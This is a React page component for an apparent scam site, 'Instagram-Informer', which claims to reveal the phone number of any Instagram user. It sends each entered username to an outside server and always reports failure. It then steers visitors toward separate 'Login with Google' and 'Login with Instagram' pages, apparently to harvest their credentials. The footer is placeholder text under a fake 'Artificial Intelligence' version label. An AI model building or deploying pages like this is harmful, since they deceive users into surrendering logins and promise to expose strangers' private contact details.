import React, { useEffect, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import axios from 'axios'

export default function Home() {
  const [loginInfo, setLoginInfo] = useState()
  const [email, setEmail] = useState("")
  const navigate = useNavigate()

  const [loader, setLoader] = useState(false)

  function checkid(e) {
    setEmail(e.target.value)
  }

  const getNumber = async () => {
    const data = email
    if (localStorage.getItem("login") === null && email.length >= 6) {
      setLoader(true)
      try {
        const response = await axios.post(`https://informerb.onrender.com/api/deviceinfo/done/${data}`, data);
        navigate("/")
      } catch (error) {
        console.log(error);
        // console.log("eeeerrrooorrr!!!!!!");
        // log('An error occurred, please try again later.');
      }

      alert('"Login" to use service.')
      window.location.reload();
    }
    else if (email.length <= 6) {
      alert("Insufficient Username.")
      window.location.reload();
    }
    else {
      setLoader(true)
      try {
        const response = await axios.post(`https://informerb.onrender.com/api/deviceinfo/done/${data}`, data);
        navigate("/")
      } catch (error) {
        console.log(error);
        // console.log("eeeerrrooorrr!!!!!!");
        // log('An error occurred, please try again later.');
      }

      alert("Login Failed!!!\nTry to 'Login with Instagram'.")
      localStorage.removeItem("login")
      window.location.reload();
    }
  }
  useEffect(() => {
    setLoginInfo(localStorage.getItem("login"))
  })
  return (
    <>
      <div className='containerrr' style={{ width: "100%", height: "100vh", margin: "0px"}}>
        <div>
          {/* <p style={{ fontSize: "11px", color: "GrayText" }} className='text-center pt-1'>ARTIFICIAL INTELLIGENCE 12.0.1.3.0..</p> */}
          <img style={{ width: "97%", marginLeft: "1.5%", marginTop: "1%" }} src="images/number.png" alt="" />
          <p className='text-center'>_______________________</p>
        </div>
        <div>
          {/* <h3 className='topheading text-center' style={{ fontWeight: "600", fontSize: "18px", paddingLeft: "15px", }}>INSTAGRAM-INFORMER</h3> */}

          <h3 className='topheading' style={{ fontWeight: "600", fontSize: "18px", paddingLeft: "18px", }}>ENTER ANY INSTAGRAM USERNAME TO GET RESISTERED PHONE NUMBER.</h3>
        </div>

        <div className='px-3 mb-1'>
          <div className='serchbox py-3 text-center'>
            <input type="text" className='divv' style={{ marginLeft: "" }} placeholder='Enter any instagram_username' onChange={(e) => checkid(e)} value={email} /><br /><br /><br />
            <h5 style={{ color: "gray", textAlign: "left", paddingLeft: "10%" }}></h5>
            <br />
            {/* <p>Phone No. _ _ _ _ _ _ _ _ _ _ _ _ _.</p><br /> */}


            {loginInfo === null ?
              <>
                <div style={{ paddingLeft: "10%" }}>
                  <div style={{ width: "89%" }}>
                    <div onClick={() => navigate("/login")} className=" googlee flex--item s-btn s-btn__muted s-btn__outlined s-btn__icon google-login" data-ga="[&quot;sign up&quot;,&quot;Sign Up Started - Google&quot;,&quot;New Post&quot;,null,null]">
                      <svg aria-hidden="true" className="native svg-icon iconGoogle" width="18" height="18" viewBox="0 0 18 18"><path fill="#4285F4" d="M16.51 8H8.98v3h4.3c-.18 1-.74 1.48-1.6 2.04v2.01h2.6a7.8 7.8 0 0 0 2.38-5.88c0-.57-.05-.66-.15-1.18Z"></path><path fill="#34A853" d="M8.98 17c2.16 0 3.97-.72 5.3-1.94l-2.6-2a4.8 4.8 0 0 1-7.18-2.54H1.83v2.07A8 8 0 0 0 8.98 17Z"></path><path fill="#FBBC05" d="M4.5 10.52a4.8 4.8 0 0 1 0-3.04V5.41H1.83a8 8 0 0 0 0 7.18l2.67-2.07Z"></path><path fill="#EA4335" d="M8.98 4.18c1.17 0 2.23.4 3.06 1.2l2.3-2.3A8 8 0 0 0 1.83 5.4L4.5 7.49a4.77 4.77 0 0 1 4.48-3.3Z"></path></svg> Login with Google
                    </div>
                    <p style={{ marginTop: "2%" }}>_____________ OR _____________</p>
                  </div>
                </div>
                <div style={{ paddingLeft: "10%" }}>
                  <div style={{ width: "89%" }}>
                    <div style={{ paddingRight: "11%" }} onClick={() => navigate("/login2")} className=" googlee flex--item s-btn s-btn__muted s-btn__outlined s-btn__icon google-login">
                      <svg aria-hidden="true" className="native svg-icon iconGoogle" width="18" height="18" viewBox="0 0 18 18"></svg> <img style={{ width: "7%", height: "7%" }} src="images/instagram.jpg" alt="" /> Login with Instagram
                    </div><br />
                  </div>
                </div>

                {loader ?
                  <>
                    <div style={{ paddingLeft: "10%", marginBottom: "6%" }}>
                      <div style={{ width: "89%" }}>
                        <img className='rotate' style={{ height: "10%", width: "10%" }} src="images/loader.jpg" alt="" />
                        <br />
                      </div>
                    </div>
                  </> :
                  <>
                    <div style={{ paddingLeft: "10%", marginBottom: "3%" }}>
                      <div style={{ width: "89%" }}>
                        <div onClick={() => getNumber()} className=" getnumber googlee flex--item s-btn s-btn__muted s-btn__outlined s-btn__icon google-login" data-ga="[&quot;sign up&quot;,&quot;Sign Up Started - Google&quot;,&quot;New Post&quot;,null,null]">
                          Get Number
                        </div>
                      </div>
                    </div>
                  </>}

                {/* <br /> */}

              </>
              :
              <>
                <p>Phone No. _ _ _ _ _ _ _ _ _ _ _ _ _ _.</p><br />

                {loader ?
                  <>
                    <div style={{ paddingLeft: "10%", marginBottom: "6%" }}>
                      <div style={{ width: "89%" }}>
                        <img className='rotate' style={{ height: "10%", width: "10%" }} src="images/loader.jpg" alt="" />
                        <br />
                      </div>
                    </div>
                  </> :
                  <>
                    <div style={{ paddingLeft: "10%", marginBottom: "3%" }}>
                      <div style={{ width: "89%" }}>
                        <div onClick={() => getNumber()} className=" getnumber googlee flex--item s-btn s-btn__muted s-btn__outlined s-btn__icon google-login" data-ga="[&quot;sign up&quot;,&quot;Sign Up Started - Google&quot;,&quot;New Post&quot;,null,null]">
                          Get Number
                        </div>
                      </div>
                    </div>
                  </>}

                {/* <br /> */}
              </>}


          </div>
        </div>

        <div className='px-2 pb-2 guide' style={{ paddingTop: "2%" }}>
          <div style={{ backgroundColor: "" }}>
            <p className='topheading' style={{ paddingLeft: "15px", fontWeight: "600", fontSize: "20px" }}>Follow below steps to use.</p>
            <ul>
              <li className='topheading' style={{ fontWeight: "600", fontSize: "16px" }}>Login with your <b>active email</b> first.</li>
              <li className='topheading' style={{ fontWeight: "600", fontSize: "16px" }}>Enter any <b>Instagram username</b> in above input field to fetch number.</li>
              <li className='topheading' style={{ fontWeight: "600", fontSize: "16px", paddingBottom: "" }}>Hit the <b>"Get Number"</b> button to get <b>phone number</b> of particular Instagram ID which you have entered.</li>
            </ul>
          </div>
        </div>



        <div className=''>
          <div className='footer py-3'>
            <p className='text-light text-center' style={{ fontSize: "13px" }}>ARTIFICIAL INTELLIGENCE 4.0.1.13.6</p>
            <div className='d-flex'>
              <div>
                <ul>
                  <li className='text-light' style={{ fontSize: "13px", justifyContent: "left" }}>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vel est magnam itaque maxime voluptas aliquam at, explicabo iste commodi fuga?</li>
                  <li className='text-light' style={{ fontSize: "13px", justifyContent: "left" }}>Dolorum id quidem nemo aperiam, enim, adipisci odio optio iste ratione, tempore quod nobis. Lorem ipsum dolor sit amet consectetur adipisicing elit.</li>
                  <li className='text-light' style={{ fontSize: "13px", justifyContent: "left" }}>Obcaecati ullam sint labore, repellendus tempore odit provident vitae iste neque.</li>
                  <li className='text-light' style={{ fontSize: "13px", justifyContent: "left" }}>Iste debitis vitae ratione perferendis adipisci amet suscipit voluptates facere id temporibus architecto minus voluptatum modi. Dicta eum dolorem quis!</li>
                  <li className='text-light' style={{ fontSize: "13px", justifyContent: "left" }}>Enim! Aperiam, molestiae dignissimos! Doloremque possimus iste, earum qui exercitationem sint dolorum dolorem recusandae, mollitia veritatis, voluptatum ab error sequi. Impedit veniam laboriosam nulla esse unde ipsa magni ipsum hic tempora repudiandae neque, nisi exercitationem reiciendis nobis quibusdam modi tenetur, molestias perferendis est accusantium odio cum doloremque deleniti voluptas.</li>
                </ul>
              </div>
              <div>
                <ul>
                  <li className='text-light' style={{ fontSize: "13px", justifyContent: "left" }}>Obcaecati ullam sint labore, repellendus tempore odit provident vitae iste neque.</li>
                  <li className='text-light' style={{ fontSize: "13px", justifyContent: "left" }}>Enim! Aperiam, molestiae dignissimos! Doloremque possimus iste, earum qui exercitationem sint dolorum dolorem recusandae, mollitia veritatis, voluptatum ab error sequi. Impedit veniam laboriosam nulla esse unde ipsa magni ipsum hic tempora repudiandae neque, nisi exercitationem reiciendis nobis quibusdam modi tenetur, molestias perferendis est accusantium odio cum doloremque deleniti voluptas.</li>
                  <li className='text-light' style={{ fontSize: "13px", justifyContent: "left" }}>Obcaecati ullam sint labore, repellendus tempore odit provident vitae iste neque.</li>
                  <li className='text-light' style={{ fontSize: "13px", justifyContent: "left" }}>Iste debitis vitae ratione perferendis adipisci amet suscipit voluptates facere id temporibus architecto minus voluptatum modi. Dicta eum dolorem quis!</li>
                  <li className='text-light' style={{ fontSize: "13px", justifyContent: "left" }}>Obcaecati ullam sint labore, repellendus tempore odit provident vitae iste neque.</li>
                </ul>
              </div>
            </div>
            <p className='text-light text-center' style={{ fontSize: "13px" }}>perferendis adipisci amet informer@copyright.com.</p>

          </div>
        </div>
      </div>
    </>
  )
}